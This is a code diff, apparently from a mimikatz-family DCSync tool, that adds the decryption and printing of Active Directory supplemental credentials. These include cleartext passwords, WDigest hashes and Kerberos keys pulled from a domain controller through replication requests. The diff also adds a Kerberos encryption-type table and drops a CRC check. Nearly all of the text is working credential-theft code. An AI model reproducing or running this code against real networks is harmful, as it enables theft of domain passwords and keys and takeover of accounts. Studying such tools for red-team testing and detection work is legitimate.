@@ -25,7 +25,7 @@ int wmain(int argc, wchar_t * argv[])
 		L" ## \\ / ##   Vincent LE TOUX            ( vincent.letoux@gmail.com )\n"
 		L" '## v ##'   http://blog.gentilkiwi.com                      (oe.eo)\n"
 		L"  '#####'    http://www.mysmartlogon.com                      * * */\n\n");	
-
+	
 	if(kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
 	{
 		kprintf(L"[DC] \'%s\' will be the user account\n", szUser);
@@ -64,7 +64,6 @@ int wmain(int argc, wchar_t * argv[])
 										descrUser(&getChRep.V6.pObjects[0].Entinf.AttrBlock);
 								}
 								else PRINT_ERROR(L"GetNCChanges: 0x%08x (%u)\n", drsStatus, drsStatus);
-
 								IDL_DRSUnbind(&hDrs);
 							}
 							__except(  (RpcExceptionCode() != STATUS_ACCESS_VIOLATION) &&
@@ -194,7 +193,7 @@ void descrUser(ATTRBLOCK *attributes)
 
 		if(findMonoAttr(attributes, ATT_DBCS_PWD, &encodedData, &encodedDataSize))
 		{
-			kprintf(L"  LM:   ");
+			kprintf(L"  LM  :   ");
 			if(decryptHash(encodedData, encodedDataSize, rid, clearHash))
 				kull_m_string_wprintf_hex(clearHash, sizeof(clearHash), 0);
 			kprintf(L"\n");
@@ -206,7 +205,123 @@ void descrUser(ATTRBLOCK *attributes)
 				kull_m_string_wprintf_hex(clearHash, sizeof(clearHash), 0);
 			kprintf(L"\n");
 		}
+
+		if(findMonoAttr(attributes, ATT_SUPPLEMENTAL_CREDENTIALS, &encodedData, &encodedDataSize))
+		{
+			kprintf(L"\nSupplemental Credentials:\n");
+			if(decryptHash(encodedData, encodedDataSize, 0, NULL))
+				descrUserProperties((PUSER_PROPERTIES) (encodedData + 16 + 4)); // avoid SALT+CRC
+		}
 	}
+}
+
+const UNICODE_STRING PrimaryCleartext = {34, 34, L"Primary:CLEARTEXT"};
+const UNICODE_STRING PrimaryWDigest = {30, 30, L"Primary:WDigest"};
+const UNICODE_STRING PrimaryKerberos = {32, 32, L"Primary:Kerberos"};
+const UNICODE_STRING PrimaryKerberosNew = {54, 54, L"Primary:Kerberos-Newer-Keys"};
+const UNICODE_STRING Packages = {16, 16, L"Packages"};
+void descrUserProperties(PUSER_PROPERTIES properties)
+{
+	DWORD i, j, k, szData;
+	PUSER_PROPERTY property;
+	PBYTE data;
+	UNICODE_STRING Name;
+	LPSTR value;
+
+	PWDIGEST_CREDENTIALS pWDigest;
+	PKERB_STORED_CREDENTIAL pKerb;
+	PKERB_KEY_DATA pKeyData;
+	PKERB_STORED_CREDENTIAL_NEW pKerbNew;
+	PKERB_KEY_DATA_NEW pKeyDataNew;
+
+	for(i = 0, property = properties->UserProperties; i < properties->PropertyCount; i++, property = (PUSER_PROPERTY) ((PBYTE) property + FIELD_OFFSET(USER_PROPERTY, PropertyName) + property->NameLength + property->ValueLength))
+	{
+		Name.Length = Name.MaximumLength = property->NameLength;
+		Name.Buffer = property->PropertyName;
+		
+		value = (LPSTR) ((LPCBYTE) property->PropertyName + property->NameLength);
+		szData = property->ValueLength / 2;
+
+		kprintf(L"* %wZ *\n", &Name);
+		if(data = (PBYTE) LocalAlloc(LPTR, szData))
+		{
+			for(j = 0; j < szData; j++)
+			{
+				sscanf_s(&value[j*2], "%02x", &k);
+				data[j] = (BYTE) k;
+			}
+
+			if(RtlEqualUnicodeString(&PrimaryCleartext, &Name, TRUE) || RtlEqualUnicodeString(&Packages, &Name, TRUE))
+			{
+				kprintf(L"    %.*s\n", szData / sizeof(wchar_t), data);
+			}
+			else if(RtlEqualUnicodeString(&PrimaryWDigest, &Name, TRUE))
+			{
+				pWDigest = (PWDIGEST_CREDENTIALS) data;
+				for(i = 0; i < pWDigest->NumberOfHashes; i++)
+				{
+					kprintf(L"    %02u  ", i + 1);
+					kull_m_string_wprintf_hex(pWDigest->Hash[i], MD5_DIGEST_LENGTH, 0);
+					kprintf(L"\n");
+				}
+			}
+			else if(RtlEqualUnicodeString(&PrimaryKerberos, &Name, TRUE))
+			{
+				pKerb = (PKERB_STORED_CREDENTIAL) data;
+				kprintf(L"    Default Salt : %.*s\n", pKerb->DefaultSaltLength / sizeof(wchar_t), (PBYTE) pKerb + pKerb->DefaultSaltOffset);
+				pKeyData = (PKERB_KEY_DATA) ((PBYTE) pKerb + sizeof(KERB_STORED_CREDENTIAL));
+				pKeyData = kuhl_m_lsadump_lsa_keyDataInfo(pKerb, pKeyData, pKerb->CredentialCount, L"Credentials");
+				kuhl_m_lsadump_lsa_keyDataInfo(pKerb, pKeyData, pKerb->OldCredentialCount, L"OldCredentials");
+			}
+			else if(RtlEqualUnicodeString(&PrimaryKerberosNew, &Name, TRUE))
+			{
+				pKerbNew = (PKERB_STORED_CREDENTIAL_NEW) data;
+				kprintf(L"    Default Salt : %.*s\n    Default Iterations : %u\n", pKerbNew->DefaultSaltLength / sizeof(wchar_t), (PBYTE) pKerbNew + pKerbNew->DefaultSaltOffset, pKerbNew->DefaultIterationCount);
+				pKeyDataNew = (PKERB_KEY_DATA_NEW) ((PBYTE) pKerbNew + sizeof(KERB_STORED_CREDENTIAL_NEW));
+				pKeyDataNew = kuhl_m_lsadump_lsa_keyDataNewInfo(pKerbNew, pKeyDataNew, pKerbNew->CredentialCount, L"Credentials");
+				pKeyDataNew = kuhl_m_lsadump_lsa_keyDataNewInfo(pKerbNew, pKeyDataNew, pKerbNew->ServiceCredentialCount, L"ServiceCredentials");
+				pKeyDataNew = kuhl_m_lsadump_lsa_keyDataNewInfo(pKerbNew, pKeyDataNew, pKerbNew->OldCredentialCount, L"OldCredentials");
+				kuhl_m_lsadump_lsa_keyDataNewInfo(pKerbNew, pKeyDataNew, pKerbNew->OlderCredentialCount, L"OlderCredentials");
+			}
+			else kull_m_string_wprintf_hex(data, szData, 1);
+			kprintf(L"\n");
+			LocalFree(data);
+		}
+	}
+}
+
+PKERB_KEY_DATA kuhl_m_lsadump_lsa_keyDataInfo(PVOID base, PKERB_KEY_DATA keys, USHORT Count, PCWSTR title)
+{
+	USHORT i;
+	if(Count)
+	{
+		if(title)
+			kprintf(L"    %s\n", title);
+		for(i = 0; i < Count; i++)
+		{
+			kprintf(L"      %s : ", kuhl_m_kerberos_ticket_etype(keys[i].KeyType));
+			kull_m_string_wprintf_hex((PBYTE) base + keys[i].KeyOffset, keys[i].KeyLength, 0);
+			kprintf(L"\n");
+		}
+	}
+	return (PKERB_KEY_DATA) ((PBYTE) keys + Count * sizeof(KERB_KEY_DATA));
+}
+
+PKERB_KEY_DATA_NEW kuhl_m_lsadump_lsa_keyDataNewInfo(PVOID base, PKERB_KEY_DATA_NEW keys, USHORT Count, PCWSTR title)
+{
+	USHORT i;
+	if(Count)
+	{
+		if(title)
+			kprintf(L"    %s\n", title);
+		for(i = 0; i < Count; i++)
+		{
+			kprintf(L"      %s (%u) : ", kuhl_m_kerberos_ticket_etype(keys[i].KeyType), keys->IterationCount);
+			kull_m_string_wprintf_hex((PBYTE) base + keys[i].KeyOffset, keys[i].KeyLength, 0);
+			kprintf(L"\n");
+		}
+	}
+	return (PKERB_KEY_DATA_NEW) ((PBYTE) keys + Count * sizeof(KERB_KEY_DATA_NEW));
 }
 
 BOOL decryptHash(PBYTE encodedData, DWORD encodedDataSize, DWORD rid, PBYTE data)
@@ -226,10 +341,50 @@ BOOL decryptHash(PBYTE encodedData, DWORD encodedDataSize, DWORD rid, PBYTE data
 	cryptoKey.Buffer = md5ctx.digest;
 	if(NT_SUCCESS(RtlEncryptDecryptRC4(&cryptoData, &cryptoKey)))
 	{
-		status = NT_SUCCESS(RtlDecryptDES2blocks1DWORD(cryptoData.Buffer + 4, &rid, data));
-		if(!status)
-			PRINT_ERROR(L"RtlDecryptDES2blocks1DWORD");
+		// no crc check, sorry guys
+		if(rid && data)
+		{
+			status = NT_SUCCESS(RtlDecryptDES2blocks1DWORD(cryptoData.Buffer + 4, &rid, data));
+			if(!status)
+				PRINT_ERROR(L"RtlDecryptDES2blocks1DWORD");
+		}
+		else
+		{
+			status = TRUE;
+		}
 	}
 	else PRINT_ERROR(L"RtlEncryptDecryptRC4");
 	return status;
+}
+
+PCWCHAR kuhl_m_kerberos_ticket_etype(LONG eType)
+{
+	PCWCHAR type;
+	switch(eType)
+	{
+	case KERB_ETYPE_NULL:							type = L"null             "; break;
+	case KERB_ETYPE_DES_PLAIN:						type = L"des_plain        "; break;
+	case KERB_ETYPE_DES_CBC_CRC:					type = L"des_cbc_crc      "; break;
+	case KERB_ETYPE_DES_CBC_MD4:					type = L"des_cbc_md4      "; break;
+	case KERB_ETYPE_DES_CBC_MD5:					type = L"des_cbc_md5      "; break;
+	case KERB_ETYPE_DES_CBC_MD5_NT:					type = L"des_cbc_md5_nt   "; break;
+	case KERB_ETYPE_RC4_PLAIN:						type = L"rc4_plain        "; break;
+	case KERB_ETYPE_RC4_PLAIN2:						type = L"rc4_plain2       "; break;
+	case KERB_ETYPE_RC4_PLAIN_EXP:					type = L"rc4_plain_exp    "; break;
+	case KERB_ETYPE_RC4_LM:							type = L"rc4_lm           "; break;
+	case KERB_ETYPE_RC4_MD4:						type = L"rc4_md4          "; break;
+	case KERB_ETYPE_RC4_SHA:						type = L"rc4_sha          "; break;
+	case KERB_ETYPE_RC4_HMAC_NT:					type = L"rc4_hmac_nt      "; break;
+	case KERB_ETYPE_RC4_HMAC_NT_EXP:				type = L"rc4_hmac_nt_exp  "; break;
+	case KERB_ETYPE_RC4_PLAIN_OLD:					type = L"rc4_plain_old    "; break;
+	case KERB_ETYPE_RC4_PLAIN_OLD_EXP:				type = L"rc4_plain_old_exp"; break;
+	case KERB_ETYPE_RC4_HMAC_OLD:					type = L"rc4_hmac_old     "; break;
+	case KERB_ETYPE_RC4_HMAC_OLD_EXP:				type = L"rc4_hmac_old_exp "; break;
+	case KERB_ETYPE_AES128_CTS_HMAC_SHA1_96_PLAIN:	type = L"aes128_hmac_plain"; break;
+	case KERB_ETYPE_AES256_CTS_HMAC_SHA1_96_PLAIN:	type = L"aes256_hmac_plain"; break;
+	case KERB_ETYPE_AES128_CTS_HMAC_SHA1_96:		type = L"aes128_hmac      "; break;
+	case KERB_ETYPE_AES256_CTS_HMAC_SHA1_96:		type = L"aes256_hmac      "; break;
+	default:										type = L"unknow           "; break;
+	}
+	return type;
 }
